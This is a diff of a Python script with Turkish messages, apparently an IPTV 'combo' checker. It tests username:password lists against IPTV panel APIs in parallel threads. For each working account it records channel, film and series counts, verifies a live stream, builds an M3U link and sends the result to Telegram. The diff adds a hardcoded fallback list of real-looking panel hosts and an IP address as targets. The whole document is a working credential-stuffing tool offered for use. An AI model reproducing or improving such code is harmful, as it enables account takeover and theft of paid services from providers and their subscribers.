@@ -49,7 +49,6 @@ session.mount('http://', adapter)
 session.mount('https://', adapter)
 
 def canli_yayin_test_et(panel, user, pas, stream_id):
-    """Çok fonksiyonlu tarayıcının en önemli özelliği: Yayının gerçekten çalışıp çalışmadığını test eder."""
     stream_url = f"http://{panel}/live/{user}/{pas}/{stream_id}.m3u8"
     try:
         res = session.get(stream_url, headers=HEADERd, timeout=4, verify=False, allow_redirects=True)
@@ -62,7 +61,6 @@ def canli_yayin_test_et(panel, user, pas, stream_id):
     return False
 
 def m3u_tara_detayli(panel, user, pas):
-    """Gelişmiş Çok Fonksiyonlu Tarayıcı Motoru"""
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
         res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
@@ -74,7 +72,7 @@ def m3u_tara_detayli(panel, user, pas):
             if status.lower() != 'active':
                 return False
 
-            print(f"[+] AKTİF HESAP BULUNDU, DETAYLAR Taranıyor... Panel: {panel} | User: {user}")
+            print(f"[+] AKTİF HESAP BULUNDU! Panel: {panel} | User: {user}")
             
             acon = user_info.get('active_cons', '?')
             mcon = user_info.get('max_connections', '?')
@@ -92,12 +90,10 @@ def m3u_tara_detayli(panel, user, pas):
             realm = realm_info.get('url', panel)
             port = realm_info.get('port', '80')
 
-            # Canlı, VOD ve Dizi İstatistikleri
             kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
             first_stream_id = None
             
             try:
-                # Canlı Yayınlar
                 k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
                 if k_res.status_code == 200:
                     live_list = k_res.json()
@@ -105,19 +101,16 @@ def m3u_tara_detayli(panel, user, pas):
                     if isinstance(live_list, list) and len(live_list) > 0:
                         first_stream_id = live_list[0].get('stream_id')
 
-                # VOD (Filmler)
                 v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
                 if v_res.status_code == 200:
                     filmsayisi = str(len(v_res.json()))
 
-                # Diziler
                 s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
                 if s_res.status_code == 200:
                     dizisayisi = str(len(s_res.json()))
             except:
                 pass
 
-            # Çok fonksiyonlu yayın test aşaması
             yayin_durumu = "⚠️ Doğrulanamadı"
             if first_stream_id:
                 if canli_yayin_test_et(panel, user, pas, first_stream_id):
@@ -128,7 +121,7 @@ def m3u_tara_detayli(panel, user, pas):
             m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
             
             mesaj = (
-                f"🔥 <b>ÇOK FONKSİYONLU TARAYICI - HİT!</b>\n"
+                f"🔥 <b>IPTV HİT BULUNDU!</b>\n"
                 f"🌐 <b>Ana Host:</b> http://{panel}\n"
                 f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                 f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
@@ -148,9 +141,9 @@ def m3u_tara_detayli(panel, user, pas):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Çok Fonksiyonlu Otonom Tarayıcı Başlatıldı...")
+    print("[*] Gelişmiş Çok Fonksiyonlu Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Çok Fonksiyonlu IPTV Tarayıcı Aktif!</b>\n⚡ Canlı Yayın Doğrulama Modu Devrede.")
+    telegrama_gonder("🚀 <b>IPTV Tarayıcı Aktif!</b>\n⚡ Tüm Paneller Sırayla Taranıyor.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -164,12 +157,28 @@ def arka_plan_tarayici():
                         p_yol = os.path.join(panel_dir, p_dosya)
                         with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                             for line in pf:
-                                p_clean = line.strip().replace('http://', '').rstrip('/')
-                                if p_clean:
-                                    paneller.append(p_clean)
+                                line = line.strip()
+                                if line and not line.startswith('#'):
+                                    # HTTP, HTTPS ve yabancı path artıklarını tertemiz temizle
+                                    p_clean = line.replace('http://', '').replace('https://', '').split('/')[0].strip()
+                                    if p_clean:
+                                        paneller.append(p_clean)
 
+            # Eğer panel bulunamazsa veya dosya boşsa senin gönderdiğin aktif panelleri yedek olarak ekle
             if not paneller:
-                paneller = ["ornekpanel.com:8080"]
+                paneller = [
+                    "darktv.eu:25461",
+                    "playhdnew765.xyz:8080",
+                    "germanyservers2.net:80",
+                    "tgr2025.pro:8080",
+                    "vipdeluxetv.trbluetv.xyz:2095",
+                    "3b9r.7041635.xyz:80",
+                    "ex.guteex.com:8000",
+                    "saray68.darktv.nl:80",
+                    "31.43.191.125:8080"
+                ]
+
+            print(f"[i] Toplam {len(paneller)} adet aktif panel yüklendi ve taranacak.")
 
             if os.path.exists(combo_dir):
                 for dosya_adi in os.listdir(combo_dir):
@@ -188,14 +197,14 @@ def arka_plan_tarayici():
                                     if user and pas:
                                         combolar.append((user, pas))
 
-                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
+                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} farklı panel ile çapraz taranıyor...")
                         
                         chunk_size = 1000
                         toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                         
                         for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                             chunk = combolar[i:i + chunk_size]
-                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
+                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap x {len(paneller)} panel)...")
                             
                             with ThreadPoolExecutor(max_workers=20) as executor:
                                 futures = [
